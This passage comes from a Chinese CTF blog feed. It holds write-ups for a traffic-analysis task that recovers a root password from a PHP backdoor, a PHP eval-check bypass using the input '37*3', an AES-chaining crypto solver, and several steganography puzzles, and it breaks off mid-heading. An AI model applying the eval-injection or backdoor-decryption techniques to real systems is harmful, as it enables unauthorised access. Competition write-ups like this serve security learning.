    <content type="html"><![CDATA[<h2 id="misc—nan’s-analysis"><a href="#misc—nan’s-analysis" class="headerlink" title="misc—nan’s analysis"></a>misc—nan’s analysis</h2><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/1.png"><br><strong>一眼丁真要流量分析找root密码</strong><br><strong>wireshark打开流量包，检索password找到一个包</strong><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/2.png"></p><blockquote><p>keyisChunqiuGame00504</p></blockquote><p>翻找流量包发现有shell.php文件，可能有后门<br>然后在终端读这个文件<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/3.png"><br>应该是零宽隐写，用下面这个网站解<br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/4.png"><br>:::success<br>压缩密码格式’abac’*4，abac为纯数字形如1213，此密码与root密码有关<br>前面找到一个密码ChunqiuGame00504<br>猜测可能是0504 *4<br> 0504050405040504<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/5.png"><br>找到一个文件上传的的地方，打开康康<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/6.png"><br>他把上传的后门给加密了，eval的时候会执行解密，直接改成echo把结果打印出来<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/7.png"><br>再跑一遍<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/8.png"><br>:::success<br>/8MARVmEAnfKntdp2/HP0w==<br>这个就是加密的root密码的密文<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/9.png"><br>上号，拿flag<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/10.png"></p><h2 id="web—-ezphp"><a href="#web—-ezphp" class="headerlink" title="web— ezphp"></a>web— ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$num </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">5</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;111&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;0&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return 111===$&#123;num&#125;;&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参考：(<a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a>)<br>:::tips<br>is_string($num)   //检查参数num是否为字符串<br>:::<br>:::info<br> strlen($num) &lt; 5   //参数num的长度要小于5<br>:::</p><blockquote><p> strpos($num,’111’) === false &amp;&amp; strpos($num,’0’) === false   //字符串里面不能含有111和0</p></blockquote><blockquote><p> eval(“return 111===${num};”)    //eval执行，要求(“return 111===${num};”)的返回值为true</p></blockquote><p> 满足以上条件就读取flag<br>关键在于 “return 111===${num};”    //${num}=$num<br>字符串里不允许有111，又要它等于111<br>一开始想到加减乘除，尝试加减无果，除法好像会超长度<br>用乘法：37x3=111</p><p>?num=37*3</p><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepnepxCATCTF</title>
    <link href="/2023/02/09/NepnepxCATCTF/"/>
    <url>/2023/02/09/NepnepxCATCTF/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/NepnepxCATCTF/CATCTF.png"></p><p><a name="ceHvQ"></a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><a name="rgliv"></a></p><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p><img src="/mdimg/NepnepxCATCTF/1.png"><br /><img src="/mdimg/NepnepxCATCTF/2.png"><br><a name="lLkVy"></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><a name="whfyc"></a></p><h3 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h3><p><img src="/mdimg/NepnepxCATCTF/3.png"><br>:::tips<br><strong>1 - 1/3 + 1/5 - 1/7 + …  是求Π/4 近似值的c语言算法     分成4份，所以是派(pie)</strong><br>:::<br> CatCTF{pie}<br><a name="cXq7p"></a></p><h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p><img src="/mdimg/NepnepxCATCTF/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data<br><br>iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) <br>iva=copy(iv)<br>key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>data=pad(data,<span class="hljs-number">16</span>)<br>c=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">16</span>):<br>    s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>    c+=cipher.encrypt(xor(s,iv))<br>    iv=xor(s,c[-<span class="hljs-number">16</span>:])<br><br><br>key=b64encode(key)<br>c=b64encode(c)<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(c)<br><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span><br><span class="hljs-string">b&#x27;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&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>:::tips<br>这段代码实现了对明文数据进行加密，并使用了 AES 加密算法，使用了 ECB 模式。<br />它先生成了一个 16 字节的随机密钥和一个 16 字节的随机初始化向量 (IV)。然后使用这个密钥和 IV 初始化一个 AES 加密器。接着，它对明文数据进行补齐，使其长度是 16 的倍数，并将明文分块。每一块都使用相同的密钥进行加密，但是使用的 IV 是加密的前一块的输出与当前块的异或。<br />最后，将加密的密钥和密文进行 base64 编码，并输出。<br>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 将密钥和密文 base64 解码</span><br>key = b64decode(<span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>)<br>ciphertext = b64decode(<span class="hljs-string">b&#x27;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&#x27;</span><br>)<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>c2 = [ciphertext[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ciphertext),<span class="hljs-number">16</span>)]<br>xor_s = []<br>xor_iv = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ciphertext <span class="hljs-keyword">in</span> c2:<br>    xor_s.append(cipher.decrypt(ciphertext))<br>    <br>s = <span class="hljs-string">b&#x27;&#x27;</span><br>tiv = <span class="hljs-string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">0x99</span>]:<br>    iv = tiv+long_to_bytes(j)<br>    trycry = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor_s)):<br>        s = xor(xor_s[i], iv)<br>        iv = xor(s, c2[i])<br>        <span class="hljs-keyword">try</span>:<br>            trycry += s.decode()<br>            <span class="hljs-keyword">if</span> trycry[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> printable:<br>                <span class="hljs-keyword">break</span><br>            trycry += <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> trycry:   <span class="hljs-comment">#查找关键字flag</span><br>        <span class="hljs-built_in">print</span>(trycry)<br>        <span class="hljs-comment">#flag&#123;This&#x27;s_why_PCBC_is_not_living&#125;</span><br></code></pre></td></tr></table></figure><p><a name="wEvbq"></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><a name="CdyBq"></a></p><h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>图片010打开检索password出密码  catflag<br />然后rabbit密码解密，密钥为catflag<br />然后base91解码<br />最后Ook解码<br /><img src="/mdimg/NepnepxCATCTF/5.png"><br /><img src="/mdimg/NepnepxCATCTF/6.png"><br /><img src="/mdimg/NepnepxCATCTF/7.png"><br><a name="pBbsC"></a></p><h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开<br /><img src="/mdimg/NepnepxCATCTF/8.png"><br>:::tips<br>CatCTF{CAT_GOES_MEOW}<br>:::<br><a name="znyp0"></a></p><h3 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h3><p>010打开检索<br /><img src="/mdimg/NepnepxCATCTF/9.png"><br>:::tips<br>CatCTF{EFI_1sv3ry_funn9}<br>:::<br><a name="AAzOJ"></a></p><h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>foremost分离出一个音频<br /><img src="/mdimg/NepnepxCATCTF/10.png"><br />Audacity打开<br /><img src="/mdimg/NepnepxCATCTF/11.png"><br />得到key：CatCTF<br />DeepSound打开<br /><img src="/mdimg/NepnepxCATCTF/12.png"><br /><img src="/mdimg/NepnepxCATCTF/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 <br></code></pre></td></tr></table></figure><p>兽音解密 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br /><img src="/mdimg/NepnepxCATCTF/14.png"><br><a name="FZXy4"></a></p><h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>打开是GPS数据<br /><img src="/mdimg/NepnepxCATCTF/15.png"><br />参考：<a href="https://blog.csdn.net/jwq2011/article/details/53674125">https://blog.csdn.net/jwq2011/article/details/53674125</a><br />GPS路径可视化<br /><img src="/mdimg/NepnepxCATCTF/16.png"><br>:::tips<br>CatCTF{GPS_M1ao}<br>:::<br><a name="TqEz9"></a></p><h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>一个一个试，试出来是百里玄策</p><p><a name="iX5fH"></a></p><h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>丢linux直接cat flag<br /><img src="/mdimg/NepnepxCATCTF/17.png"><br><a name="Wl3K6"></a></p><h3 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 